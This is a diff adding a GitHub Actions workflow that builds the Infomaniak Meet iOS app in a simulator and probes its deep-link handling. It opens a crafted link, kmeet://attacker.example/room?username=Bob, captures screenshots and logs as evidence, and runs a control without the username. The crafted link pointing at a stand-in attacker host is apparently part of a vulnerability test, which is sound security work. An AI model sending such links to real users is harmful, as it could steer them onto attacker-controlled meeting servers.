@@ -1,0 +1,67 @@
+name: kmeet-probe5
+on: workflow_dispatch
+
+jobs:
+  probe:
+    runs-on: macos-latest
+    timeout-minutes: 150
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Toolchain
+        run: |
+          xcodebuild -version
+          xcrun simctl list devices available | grep -i iphone | head -5
+
+      - name: Boot simulator first
+        run: |
+          UDID=$(xcrun simctl list devices available | grep -m1 -i "iPhone 16" | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/')
+          if [ -z "$UDID" ]; then UDID=$(xcrun simctl list devices available | grep -m1 -i "iPhone" | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/'); fi
+          echo "UDID=$UDID" >> "$GITHUB_ENV"
+          xcrun simctl boot "$UDID" || true
+          xcrun simctl bootstatus "$UDID" -b || true
+          echo "booted $UDID"
+
+      - name: Build for that simulator (default ad-hoc signing)
+        run: |
+          set -o pipefail
+          xcodebuild -project MeetInfomaniak.xcodeproj -scheme MeetInfomaniak -configuration Debug -derivedDataPath "$PWD/build" -destination "platform=iOS Simulator,id=$UDID" build 2>&1 | tail -30
+
+      - name: Install
+        run: |
+          APP=$(find build/Build/Products -maxdepth 2 -name "MeetInfomaniak.app" | head -1)
+          echo "app=$APP"
+          /usr/libexec/PlistBuddy -c 'Print :CFBundleIdentifier' "$APP/Info.plist" || true
+          xcrun simctl install "$UDID" "$APP"
+          xcrun simctl io "$UDID" screenshot 00-baseline.png || true
+
+      - name: Deep link kmeet://attacker.example/room?username=Bob
+        run: |
+          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
+          sleep 1
+          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room?username=Bob"
+          for i in 3 5 8 12 18; do sleep 2; xcrun simctl io "$UDID" screenshot "10-deeplink-t$i.png" || true; done
+
+      - name: App logs
+        run: |
+          xcrun simctl spawn "$UDID" log show --last 3m --style compact --predicate 'processImagePath CONTAINS "MeetInfomaniak"' > applog.txt 2>&1 || true
+          echo "=== attacker.example ==="; grep -i "attacker.example" applog.txt | head -20 || echo none
+          echo "=== jitsi/config ==="; grep -iE "config.js|JitsiMeet|conference|serverURL" applog.txt | head -20 || true
+
+      - name: Control run without username
+        run: |
+          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
+          sleep 1
+          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room"
+          sleep 8
+          xcrun simctl io "$UDID" screenshot 20-control-no-username.png || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kmeet-evidence
+          path: |
+            *.png
+            applog.txt
+          if-no-files-found: warn
